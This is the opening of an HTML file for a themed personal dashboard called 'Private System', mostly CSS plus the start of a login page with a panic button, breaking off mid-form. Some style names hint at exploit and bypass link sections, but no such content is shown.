<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <style>
    /* Global CSS Variables */
    :root {
      --primary-color-dark: #ff914d; /* Orange Accent */
      --secondary-color-dark: #2a2a2a; /* Dark Grey Box Background */
      --background-color-dark: #1a1a1a; /* Darkest Background */
      --text-color-dark: #f9f2dc; /* Light Cream Text */
      --box-shadow-dark: rgba(255, 145, 77, 0.3);

      --primary-color-light: #ffd966; /* Yellow Accent */
      --secondary-color-light: #ffd999; /* Lighter Yellow Box Background */
      --background-color-light: #f9f2dc; /* Light Background */
      --text-color-light: #1a1a1a; /* Dark Text */
      --box-shadow-light: rgba(255, 145, 77, 0.6);

      /* Login Specific Colors (consistent across themes) */
      --login-box-bg: #000;
      --login-box-border: white;
      --login-box-shadow: 0 0 15px white;
      --input-bg: #1c1c1c;
      --input-color: white;
      --button-bg: red;
      --button-color: white;
      --error-color: red;

      /* Dashboard Specific Colors (default dark theme) */
      --dashboard-header-bg: var(--primary-color-dark);
      --dashboard-header-text: #000;
      --quickbar-button-bg: var(--primary-color-dark);
      --quickbar-button-hover-bg: #ffb67a;
      --dashboard-box-bg: var(--secondary-color-dark);
      --dashboard-box-shadow: var(--box-shadow-dark);
      --dashboard-box-h2: #ffbf80;
      --update-entry-bg: #40210f;
      --update-entry-text: #ffccb3;
      --calendar-cell-bg: #333;
      --calendar-today-bg: var(--primary-color-dark);
      --motivation-box-bg: #333;
      --motivation-box-text: #ffd966;
      --canvas-border: var(--primary-color-dark);
      --info-panel-bg: var(--secondary-color-dark);
      --info-panel-h2: var(--primary-color-dark);
      --list-link-button-bg: var(--primary-color-dark);
      --coming-soon-bg: #40210f;
      --info-text-bg: #40210f;
      --school-info-item-bg: #40210f;
      --school-info-label-color: var(--primary-color-dark);
      --activity-log-entry-bg: #333;
      --activity-log-entry-text: #ffccb3;

      /* WiFi level colors */
      --wifi-high-color: #28a745; /* Green */
      --wifi-medium-color: #ffc107; /* Yellow */
      --wifi-low-color: #dc3545; /* Red */
    }

    /* Light Theme Overrides */
    body.light-theme {
      background: var(--background-color-light);
      color: var(--text-color-light);

      --dashboard-header-bg: var(--primary-color-light);
      --dashboard-header-text: var(--text-color-light);
      --quickbar-button-bg: var(--primary-color-light);
      --quickbar-button-hover-bg: #fcdf87;
      --dashboard-box-bg: var(--primary-color-light);
      --dashboard-box-shadow: var(--box-shadow-light);
      --dashboard-box-h2: #994d00;
      --update-entry-bg: #ffd999;
      --update-entry-text: #994d00;
      --calendar-cell-bg: var(--primary-color-light);
      --calendar-today-bg: #994d00;
      --motivation-box-bg: #fff3cc;
      --motivation-box-text: #994d00;
      --canvas-border: #994d00;
      --info-panel-bg: var(--primary-color-light);
      --info-panel-h2: #994d00;
      --list-link-button-bg: var(--primary-color-light);
      --coming-soon-bg: #ffd999;
      --info-text-bg: #ffd999;
      --school-info-item-bg: #ffd999;
      --school-info-label-color: #994d00;
      --activity-log-entry-bg: #ffd999;
      --activity-log-entry-text: #994d00;
    }

    /* Blue Theme Overrides */
    body.blue-theme {
      background-color: #2b3a50; /* Dark Blue Background */
      color: #e0f2f7; /* Light Blue Text */

      --dashboard-header-bg: #5dade2; /* Medium Blue Accent */
      --dashboard-header-text: #0d2847;
      --quickbar-button-bg: #5dade2;
      --quickbar-button-hover-bg: #85c1e9;
      --dashboard-box-bg: #3b4e6b; /* Darker Blue Box Background */
      --dashboard-box-shadow: rgba(93, 173, 226, 0.4);
      --dashboard-box-h2: #aed6f1; /* Lighter Blue Headers */
      --update-entry-bg: #4a5c78;
      --update-entry-text: #d1e9f7;
      --calendar-cell-bg: #4a5c78;
      --calendar-today-bg: #5dade2;
      --motivation-box-bg: #3f587a;
      --motivation-box-text: #aed6f1;
      --canvas-border: #5dade2;
      --info-panel-bg: #3b4e6b;
      --info-panel-h2: #aed6f1;
      --list-link-button-bg: #5dade2;
      --coming-soon-bg: #4a5c78;
      --info-text-bg: #4a5c78;
      --school-info-item-bg: #4a5c78;
      --school-info-label-color: #aed6f1;
      --activity-log-entry-bg: #4a5c78;
      --activity-log-entry-text: #d1e9f7;

      /* Keep login elements consistent or specify */
      --login-box-bg: #000;
      --login-box-border: white;
      --login-box-shadow: 0 0 15px white;
      --input-bg: #1c1c1c;
      --input-color: white;
      --button-bg: red;
      --button-color: white;
      --error-color: red;
    }


    /* General Body Styling */
    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }
    
    body {
      margin: 0; padding: 0;
      background: var(--background-color-dark);
      color: var(--text-color-dark);
      min-height: 100vh; /* Ensure body covers full height */
      overflow-x: hidden; /* Prevent horizontal scroll due to animations/dragging */
    }

    /* Initial Loading Screen Styles */
    #initialLoadingScreen, #loginLoadingScreen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: #000;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      z-index: 9999;
      opacity: 1;
      visibility: visible;
      transition: opacity 0.8s ease-out, visibility 0.8s ease-out; /* Smoother transition */
    }

    #initialLoadingScreen.hidden, #loginLoadingScreen.hidden {
      opacity: 0;
      visibility: hidden;
    }

    .rotating-box-container {
      perspective: 1000px;
      margin-bottom: 20px;
    }

    .rotating-box {
      width: 100px;
      height: 100px;
      position: relative;
      transform-style: preserve-3d;
      animation: rotateCube 10s infinite linear;
      transform-origin: 50% 50%;
    }

    .rotating-box .face {
      position: absolute;
      width: 100%;
      height: 100%;
      border: 3px solid white;
      background: rgba(255, 145, 77, 0.4); /* Transparent orange */
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 0.8em;
      font-weight: bold;
      color: white;
      text-shadow: 0 0 5px black;
      box-shadow: 0 0 10px white;
      transition: background 0.5s ease-in-out, border-color 0.5s ease-in-out, box-shadow 0.5s ease-in-out;
    }

    /* Specific face transforms for 3D effect */
    .rotating-box .front { transform: translateZ(50px); }
    .rotating-box .back { transform: rotateY(180deg) translateZ(50px); }
    .rotating-box .right { transform: rotateY(90deg) translateZ(50px); }
    .rotating-box .left { transform: rotateY(-90deg) translateZ(50px); }
    .rotating-box .top { transform: rotateX(90deg) translateZ(50px); }
    .rotating-box .bottom { transform: rotateX(-90deg) translateZ(50px); }

    @keyframes rotateCube {
      0% { transform: rotateX(0deg) rotateY(0deg) rotateZ(0deg); }
      100% { transform: rotateX(360deg) rotateY(360deg) rotateZ(360deg); }
    }

    #loadingText {
      font-family: 'Courier New', monospace;
      font-size: 1.5em;
      font-weight: bold;
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      color: transparent; /* Fallback */
      transition: background-image 1s ease-in-out, opacity 0.5s ease-in-out;
      opacity: 1;
    }
    #loadingText.fading {
      opacity: 0.3;
    }


    #codeAnimation {
      display: none; /* Initially hidden */
      width: 80%;
      max-width: 400px;
      height: 20px;
      background-color: #333;
      border-radius: 10px;
      overflow: hidden;
      margin-top: 10px;
      position: relative;
    }

    #codeAnimation::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(to right, #4CAF50, #2196F3); /* Green to Blue */
      animation: codeFill 3s ease-out forwards;
      clip-path: inset(0 100% 0 0); /* Start completely hidden */
    }

    @keyframes codeFill {
      0% { clip-path: inset(0 100% 0 0); }
      100% { clip-path: inset(0 0% 0 0); }
    }

    /* Login Quick Bar Styles */
    .login-quick-bar {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      display: flex;
      justify-content: flex-end; /* Align to right */
      align-items: center;
      padding: 10px 20px;
      background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent */
      gap: 10px;
      z-index: 1000; /* Above login box */
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
    }
    
    .login-quick-bar button {
      background-color: #ff4c4c; /* Red for panic, others can be adjusted */
      border: none;
      padding: 8px 12px;
      border-radius: 5px;
      color: white;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s ease-in-out, transform 0.1s;
    }
    
    .login-quick-bar button:hover {
      background-color: #e60000;
      transform: translateY(-2px);
    }
    .login-quick-bar button:active {
        transform: translateY(0);
    }

    /* Login System Styles */
    body.login-body {
      background: var(--background-color-dark); /* Ensure it's dark by default */
      color: var(--text-color-dark);
      display: flex;
      flex-direction: column; /* Allow login box and date-time box to stack */
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden; /* Prevent body scroll while loading */
    }
    
    .login-box {
      background: var(--login-box-bg);
      border-radius: 20px;
      border: 3px solid var(--login-box-border);
      box-shadow: var(--login-box-shadow);
      width: 380px;
      padding: 30px 25px;
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, transform 0.3s ease-in-out; /* Add transform transition */
      display: none; /* Hidden by default, shown after initial load */
      margin-bottom: 20px; /* Space between login box and date/time box */
    }

    .login-box:hover {
        transform: translateY(-5px); /* Lift effect on hover */
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }
    
    .login-box h2 {
      font-size: 1.7em;
      margin-bottom: 20px;
      font-family: 'Courier New', monospace;
      color: var(--text-color-dark);
    }
    
    .login-box input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      background: var(--input-bg);
      border: none;
      color: var(--input-color);
      border-radius: 8px;
      font-size: 1em;
      box-sizing: border-box;
      transition: border-color 0.2s;
    }
    .login-box input:focus {
        outline: none;
        border: 1px solid var(--primary-color-dark);
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.9em;
      margin-bottom: 10px;
      gap: 10px;
      cursor: pointer;
      color: var(--text-color-dark);
    }

    /* Show password & 24hr format toggle switch */
    .switch {
      position: relative;
      display: inline-block;
      width: 45px;
      height: 24px;
      flex-shrink: 0; /* Prevent switch from shrinking */
    }

    .switch input {
      opacity: 0;
      width: 0;
      height: 0;
    }

    .slider {
      position: absolute;
      cursor: pointer;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background-color: #ccc;
      transition: .4s;
      border-radius: 24px;
    }

    .slider:before {
      position: absolute;
      content: "";
      height: 16px;
      width: 16px;
      left: 4px;
      bottom: 4px;
      background-color: white;
      transition: .4s;
      border-radius: 50%;
    }

    input:checked + .slider {
      background-color: #4CAF50;
    }

    input:focus + .slider {
      box-shadow: 0 0 1px #4CAF50;
    }

    input:checked + .slider:before {
      transform: translateX(21px);
    }
    
    .login-box button {
      width: 100%;
      padding: 12px;
      background-color: var(--button-bg);
      color: var(--button-color);
      font-size: 1em;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
      transition: background 0.2s, transform 0.1s;
    }
    .login-box button:hover {
        transform: translateY(-2px);
    }
    .login-box button:active {
        transform: translateY(0);
    }
    
    .attempt-counter, .error-message {
      margin-top: 10px;
      font-size: 0.85em;
      color: var(--error-color);
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 320px;
      padding: 20px;
      transform: translate(-50%, -50%);
      background: black;
      border: 3px solid white;
      border-radius: 15px;
      box-shadow: 0 0 20px white;
      z-index: 10;
    }
    
    .popup input {
      margin-bottom: 15px;
    }

    /* Login Page Current Time/Date Box */
    .login-datetime-box {
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid rgba(255, 255, 255, 0.3);
      border-radius: 10px;
      padding: 15px 20px;
      color: white;
      font-family: 'Consolas', monospace;
      font-size: 1.1em;
      text-align: left;
      width: 380px;
      max-width: 90%;
      box-sizing: border-box;
      display: none; /* Controlled by JS to show after initial loading */
      flex-direction: column;
      gap: 8px;
      transition: transform 0.3s ease-in-out;
    }
    .login-datetime-box:hover {
        transform: translateY(-5px); /* Lift effect on hover */
    }

    .login-datetime-box div {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    /* Toggle for 24h format in login date/time box */
    .format-toggle {
      display: flex;
      align-items: center;
      gap: 10px;
      cursor: pointer;
      justify-content: flex-end; /* Align the label and switch to the right */
      font-size: 0.9em;
      margin-top: 10px;
    }
    .format-toggle span:first-child {
        flex-grow: 1; /* Allow the text to take up available space */
        text-align: right;
    }


    /* Dashboard Styles */
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: var(--background-color-dark);
      color: var(--text-color-dark);
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
      zoom: 1; 
      min-height: 100vh;
    }

    /* Notification for Welcome User */
    #welcomeNotification {
      position: fixed;
      top: 20px;
      right: 20px;
      background-color: #4CAF50;
      color: white;
      padding: 10px 20px;
      border-radius: 8px;
      font-weight: bold;
      z-index: 1001;
      opacity: 0;
      visibility: hidden;
      transform: translateX(100%);
      transition: opacity 0.5s ease-out, visibility 0.5s ease-out, transform 0.5s cubic-bezier(0.68, -0.55, 0.27, 1.55); /* Bounce effect */
    }

    #welcomeNotification.show {
      opacity: 1;
      visibility: visible;
      transform: translateX(0);
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--dashboard-header-bg);
      padding: 15px 25px;
      border-radius: 12px;
      color: var(--dashboard-header-text);
      margin-bottom: 20px;
      box-shadow: 0 4px 8px rgba(0,0,0,0.2);
    }
    
    .dashboard-header h1 {
      font-size: 24px;
      margin: 0; /* Remove default margin */
    }
    
    .user-info {
      font-weight: bold;
      font-size: 14px;
    }
    
    .version-box {
      background: var(--primary-color-light); /* Version box always bright-ish */
      padding: 8px 15px;
      border-radius: 8px;
      color: #000;
      font-weight: bold;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 12px;
      margin-bottom: 10px; 
      flex-wrap: wrap;
      position: sticky;
      top: 0;
      background-color: inherit;
      padding: 10px 0;
      z-index: 99;
    }

    .quick-bar input[type="search"] {
      flex-grow: 1; /* Allow search bar to expand */
      max-width: 300px;
      padding: 10px 14px;
      border-radius: 8px;
      border: 1px solid rgba(255, 255, 255, 0.2);
      background-color: #333;
      color: white;
      min-width: 150px;
      transition: border-color 0.2s, background-color 0.2s;
    }
    .quick-bar input[type="search"]::placeholder {
      color: #ccc;
    }
    .quick-bar input[type="search"]:focus {
      outline: none;
      border-color: var(--primary-color-dark);
      background-color: #2a2a2a;
    }
    
    .quick-bar button {
      background-color: var(--quickbar-button-bg);
      border: none;
      padding: 10px 14px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      min-width: 110px;
      white-space: nowrap;
    }
    
    .quick-bar button:hover {
      background-color: var(--quickbar-button-hover-bg);
      transform: translateY(-2px);
    }
    .quick-bar button:active {
        transform: translateY(0);
    }
    
    #panicBtn {
      background: #ff4c4c !important;
      color: white !important;
    }
    #panicBtn:hover {
      background: #e60000 !important;
    }

    /* Draggable/Resizable Panel Handle */
    .panel-handle {
        cursor: grab;
        background-color: rgba(255, 255, 255, 0.08); /* More subtle */
        padding: 5px;
        border-radius: 5px;
        margin-bottom: 10px;
        text-align: center;
        font-size: 0.75em; /* Smaller font */
        color: rgba(255, 255, 255, 0.5); /* Lighter text */
        transition: background-color 0.2s;
        user-select: none; /* Prevent text selection */
        display: none; /* Hidden by default, toggled by settings */
    }
    .panel-handle:hover {
        background-color: rgba(255, 255, 255, 0.15);
    }
    .panel-handle:active {
        cursor: grabbing;
    }

    .announcement-bar {
      width: 100%;
      background-color: var(--dashboard-header-bg);
      color: var(--dashboard-header-text);
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 8px;
      box-sizing: border-box;
      margin-bottom: 20px;
      user-select: none;
      height: 30px;
      line-height: 13px;
    }
    
    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 15s linear infinite;
      padding-left: 100%;
    }
    
    @keyframes scrollLeft {
      0% {
        transform: translateX(0%);
      }
      100% {
        transform: translateX(-100%);
      }
    }
    
    .main-row {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
      flex-wrap: wrap;
    }
    
    .box {
      background-color: var(--dashboard-box-bg);
      padding: 20px;
      border-radius: 12px;
      box-shadow: var(--dashboard-box-shadow);
      min-height: 120px;
      transition: background-color 0.3s, color 0.3s, transform 0.1s ease-out; /* Smooth hover effect */
      flex: 1 1 300px;
      position: relative; /* For draggable & handles */
    }
    .box:hover {
        transform: translateY(-3px); /* Slight lift on hover */
    }
    
    .box h2 {
      font-size: 18px;
      margin-bottom: 10px;
      color: var(--dashboard-box-h2);
    }
    
    .box p, .box ul {
      font-size: 14px;
    }
    
    .update-entry {
      background: var(--update-entry-bg);
      padding: 8px;
      margin-top: 5px;
      border-radius: 6px;
      color: var(--update-entry-text);
      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
    }
    
    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 5px;
      margin-top: 10px;
      text-align: center;
      font-size: 12px;
    }
    
    .calendar div {
      padding: 6px;
      background: var(--calendar-cell-bg);
      border-radius: 4px;
    }
    
    .today {
      background: var(--calendar-today-bg) !important;
      font-weight: bold;
      color: black; /* Always black text for "today" highlight */
    }
    
    .motivation-box {
      background-color: var(--motivation-box-bg);
      color: var(--motivation-box-text);
      padding: 20px;
      border-radius: 12px;
      font-style: italic;
      font-size: 16px;
      box-shadow: 0 0 12px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 120px;
      text-align: center;
    }
    
    #canvasContainer {
      display: none;
      margin-top: 20px;
      text-align: center;
      background-color: var(--dashboard-box-bg); /* Use dashboard box bg for consistency */
      padding: 20px;
      border-radius: 12px;
      box-shadow: var(--dashboard-box-shadow);
    }
    
    #notesCanvas {
      border: 2px solid var(--canvas-border);
      border-radius: 12px;
      background: #fff;
      cursor: crosshair;
      touch-action: none;
      box-shadow: 0 0 10px rgba(255, 145, 77, 0.3); /* Softer glow */
    }
    
    #canvasControls {
      margin-top: 15px; /* More space */
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px; /* Slightly more space */
    }
    
    #canvasControls button {
      background-color: var(--primary-color-dark);
      border: none;
      padding: 8px 16px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      margin: 0;
    }
    
    #canvasControls button:hover {
      background-color: var(--quickbar-button-hover-bg);
      transform: translateY(-2px);
    }
    #canvasControls button:active {
        transform: translateY(0);
    }

    /* Canvas color picker & slider styling */
    #canvasControls input[type="color"] {
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
        width: 32px;
        height: 32px;
        background-color: transparent;
        border: none;
        cursor: pointer;
        padding: 0;
        box-shadow: 0 0 0 2px var(--canvas-border); /* Consistent border around picker */
        border-radius: 50%;
        overflow: hidden; /* Hide default swatch border */
    }
    #canvasControls input[type="color"]::-webkit-color-swatch-wrapper {
      padding: 0;
    }
    #canvasControls input[type="color"]::-webkit-color-swatch {
        border-radius: 50%;
        border: none;
    }
    #canvasControls input[type="color"]::-moz-color-swatch {
        border-radius: 50%;
        border: none;
    }

    #canvasControls input[type="range"] {
        -webkit-appearance: none;
        width: 100px;
        height: 8px;
        background: #ddd;
        border-radius: 5px;
        outline: none;
        opacity: 0.7;
        transition: opacity .2s;
    }
    #canvasControls input[type="range"]:hover {
        opacity: 1;
    }
    #canvasControls input[type="range"]::-webkit-slider-thumb {
        -webkit-appearance: none;
        appearance: none;
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: var(--primary-color-dark);
        cursor: pointer;
        box-shadow: 0 0 3px rgba(0,0,0,0.3);
    }
    #canvasControls input[type="range"]::-moz-range-thumb {
        width: 20px;
        height: 20px;
        border-radius: 50%;
        background: var(--primary-color-dark);
        cursor: pointer;
        box-shadow: 0 0 3px rgba(0,0,0,0.3);
    }

    #textNotesArea {
        display: none; /* Controlled by JS */
        width: calc(600px - 20px);
        max-width: calc(100% - 20px);
        height: 150px;
        margin-top: 15px; /* Adjusted margin */
        padding: 10px;
        background-color: #2a2a2a;
        border: 1px solid var(--canvas-border);
        border-radius: 8px;
        color: white;
        resize: vertical; /* Allow vertical resizing */
        font-size: 0.95em;
    }
    
    /* Info Panel Styles */
    .info-panel {
      display: none;
      background-color: var(--info-panel-bg);
      padding: 20px;
      border-radius: 12px;
      margin-top: 20px;
      box-shadow: var(--dashboard-box-shadow);
    }
    
    .info-panel h2 {
      color: var(--info-panel-h2);
      margin-bottom: 15px;
    }
    
    .wifi-grid {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 15px;
    }
    
    .wifi-grid div {
      padding: 8px;
      background: #333;
      border-radius: 6px;
      text-align: center;
      font-weight: bold;
      color: #fff; /* Ensure text is white for headers */
    }
    
    .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 10px;
      margin-bottom: 10px;
    }
    
    .wifi-entry div {
      padding: 8px;
      background: #40210f;
      border-radius: 6px;
      text-align: center;
    }
    
    /* WiFi level colors */
    .wifi-level-high { background-color: var(--wifi-high-color) !important; color: black !important; }
    .wifi-level-medium { background-color: var(--wifi-medium-color) !important; color: black !important; }
    .wifi-level-low { background-color: var(--wifi-low-color) !important; color: white !important; }


    /* Generic button/link list styles used by handbook, student websites, etc. */
    .handbook-buttons, .links-list, .exploit-buttons, .bypass-buttons, .ipad-options {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }
    .handbook-buttons a, .links-list a, .exploit-buttons a, .bypass-buttons button, .ipad-options button {
      background-color: var(--list-link-button-bg);
      border: none;
      padding: 12px;
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      text-decoration: none;
      text-align: center;
      display: flex; /* Use flex for vertical centering if text wraps */
      align-items: center;
      justify-content: center;
      min-height: 40px; /* Ensure a minimum height */
    }
    .handbook-buttons a:hover, .links-list a:hover, .exploit-buttons a:hover, .bypass-buttons button:hover, .ipad-options button:hover {
      background-color: var(--quickbar-button-hover-bg);
      transform: translateY(-2px);
    }
    .handbook-buttons a:active, .links-list a:active, .exploit-buttons a:active, .bypass-buttons button:active, .ipad-options button:active {
        transform: translateY(0);
    }
    
    .coming-soon {
      background: var(--coming-soon-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      text-align: center;
      font-weight: bold;
      opacity: 0.8;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    
    .info-text {
      background: var(--info-text-bg);
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
      line-height: 1.6;
    }
    
    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 10px;
      margin-top: 15px;
    }
    
    .school-info-item {
      background: var(--school-info-item-bg);
      padding: 12px;
      border-radius: 8px;
    }
    
    .school-info-label {
      font-weight: bold;
      color: var(--school-info-label-color);
      margin-bottom: 5px;
    }
    
    .ipad-content, .bypass-content {
      display: none;
      background: var(--coming-soon-bg); /* Use similar background for content areas */
      padding: 15px;
      border-radius: 8px;
      margin-top: 15px;
    }
    
    /* Calculator and Unit Converter styles */
    .calculator-grid {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 5px;
      width: 250px; /* Fixed width */
      margin: 10px auto;
      background-color: #333;
      padding: 10px;
      border-radius: 10px;
    }
    .calculator-display {
      grid-column: span 4;
      background-color: #444;
      color: white;
      padding: 10px;
      border-radius: 5px;
      text-align: right;
      font-size: 1.5em;
      margin-bottom: 5px;
      overflow-x: auto; /* Allow display to scroll horizontally */
    }
    .calculator-grid button {
      background-color: #555;
      color: white;
      border: none;
      padding: 15px;
      border-radius: 5px;
      font-size: 1.1em;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.1s;
    }
    .calculator-grid button:hover {
      background-color: #777;
      transform: translateY(-2px);
    }
    .calculator-grid button:active {
        transform: translateY(0);
    }
    .calculator-grid .operator {
      background-color: var(--primary-color-dark);
      color: black;
    }
    .calculator-grid .operator:hover {
      background-color: var(--quickbar-button-hover-bg);
    }
    .calculator-grid .equal {
      background-color: #28a745;
    }
    .calculator-grid .equal:hover {
      background-color: #218838;
    }
    .unit-converter-input-group {
      display: flex;
      flex-wrap: wrap; /* Allow wrapping on smaller screens */
      gap: 10px;
      margin-bottom: 10px;
      align-items: center;
      justify-content: center;
    }
    .unit-converter-input-group input, .unit-converter-input-group select {
      padding: 8px;
      border-radius: 5px;
      border: 1px solid #555;
      background-color: #333;
      color: white;
      flex-grow: 1;
      min-width: 100px;
      transition: border-color 0.2s;
    }
    .unit-converter-input-group input:focus, .unit-converter-input-group select:focus {
        outline: none;
        border-color: var(--primary-color-dark);
    }
    .unit-converter-input-group input::placeholder {
      color: #ccc;
    }
    .unit-converter-result {
      margin-top: 15px;
      font-size: 1.2em;
      font-weight: bold;
      background-color: var(--update-entry-bg); /* Use a consistent dark entry background */
      padding: 10px;
      border-radius: 8px;
      color: var(--update-entry-text);
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    #settingsPanel ul, #keybindsPanel ul, #remindersList {
      list-style: none;
      padding: 0;
    }
    #settingsPanel ul li, #keybindsPanel ul li, #remindersList div {
      margin-bottom: 10px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: var(--activity-log-entry-bg);
      padding: 10px;
      border-radius: 8px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
    }
    #settingsPanel ul li span:first-child, #keybindsPanel ul li span:first-child {
        font-weight: bold;
        margin-right: 10px;
        color: var(--text-color-dark);
    }
    #settingsPanel select, #settingsPanel input[type="text"], #keybindsPanel input[type="text"],
    #utilitiesPanel input[type="number"], #remindersPanel input[type="text"], #remindersPanel input[type="datetime-local"] {
      padding: 5px 10px;
      border-radius: 4px;
      border: 1px solid #555;
      background-color: #444;
      color: white;
      flex-grow: 1;
      min-width: 120px;
      transition: border-color 0.2s;
    }
    #settingsPanel select:focus, #settingsPanel input[type="text"]:focus, #keybindsPanel input[type="text"]:focus,
    #utilitiesPanel input[type="number"]:focus, #remindersPanel input[type="text"]:focus, #remindersPanel input[type="datetime-local"]:focus {
        outline: none;
        border-color: var(--primary-color-dark);
    }

    /* Small button used in settings panel */
    button.small-btn {
        padding: 5px 10px;
        border-radius: 5px;
        background-color: #6c757d; /* Muted grey */
        color: white;
        border: none;
        cursor: pointer;
        font-size: 0.85em;
        transition: background-color 0.2s, transform 0.1s;
    }
    button.small-btn:hover {
        background-color: #5a6268;
        transform: translateY(-2px);
    }
    button.small-btn:active {
        transform: translateY(0);
    }


    /* Activity Log Entry */
    .activity-log-entry {
        background: var(--activity-log-entry-bg);
        padding: 8px;
        margin-top: 5px;
        border-radius: 6px;
        color: var(--activity-log-entry-text);
        font-size: 0.9em;
        box-shadow: 0 1px 3px rgba(0,0,0,0.1);
    }
    
    #loginActivityLogs {
        max-height: 200px;
        overflow-y: auto;
        margin-top: 15px;
        padding: 5px; /* Added padding to make it less cramped */
        background: #0d0d0d; /* Slightly darker for login logs */
        border-radius: 8px;
        border: 1px solid #444;
        text-align: left;
    }
    #dashboardActivityLogs, #loginHistoryPanelContent {
      max-height: 400px;
      overflow-y: auto;
      padding-right: 5px; /* Scrollbar consideration */
      padding-top: 5px; /* Padding for the top entry */
    }
    
    /* Responsive adjustments */
    @media (max-width: 768px) {
      .quick-bar {
        flex-direction: column;
        align-items: stretch;
      }
      .quick-bar button, .quick-bar input[type="search"] {
        min-width: unset;
        width: 100%;
      }
      .main-row, #updatesNotifications {
        flex-direction: column;
        gap: 15px;
      }
      .login-box, .login-datetime-box {
          width: 95%; /* Adjust width for smaller screens */
          max-width: 380px; /* But keep a max width */
      }
    }

  </style>
  
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  <!-- Interact.js for drag and resize functionality -->
  <script src="https://cdn.jsdelivr.net/npm/interactjs/dist/interact.min.js"></script>

</head>
<body class="dark-theme" id="bodyElement">

  <!-- Initial Loading Screen -->
  <div id="initialLoadingScreen">
    <div class="rotating-box-container">
      <div class="rotating-box">
        <div class="face front">SYS</div>
        <div class="face back">STEM</div>
        <div class="face right">LOAD</div>
        <div class="face left">ING</div>
        <div class="face top">...</div>
        <div class="face bottom"></div>
      </div>
    </div>
    <div id="loadingText" style="background-image: linear-gradient(to right, orange, red);">Initializing System...</div>
  </div>

  <!-- Login Page Quick Bar -->
  <div class="login-quick-bar" id="loginQuickBar" style="display:none;">
    <button id="loginPanicBtn">🚨 Panic</button>
    <button id="loginZoomInBtn">➕ Zoom In</button>
    <button id="loginZoomOutBtn">➖ Zoom Out</button>
  </div>

  <!-- Login System -->
  <div class="login-box" id="loginBox">
    <h2>𝙋𝙧𝙞𝙫𝙖𝙩𝙚 𝙎𝙮𝙨𝙩𝙚𝙢</h2>

    <input type="text" id="username" placeholder="Enter Username..." autocomplete="off" />
    <input type="password" id="password" placeholder="Enter Password..." autocomplete="off" />
    <input type="text" id="userID" placeholder="Enter User Identifier..." autocomplete="off" />

    <label for="showPassword">
      <span style="flex-grow:1; text-align:left;">Show Password</span>
      <label class="switch">
        <input type="checkbox" id="showPassword" />
        <span class="slider"></span>
      </label>
    </label>

    <button id="submitBtn">Submit</button>

    <div class="error-message" id="errorMsg"></div>
    <div class="attempt-counter" id="attemptsText">Attempts Left: 3</div>

    <button id="viewLoginHistoryBtn" style="margin-top: 15px; background-color: #3498db;">Login Activity Logs</button>
    <div id="loginActivityLogs"></div>
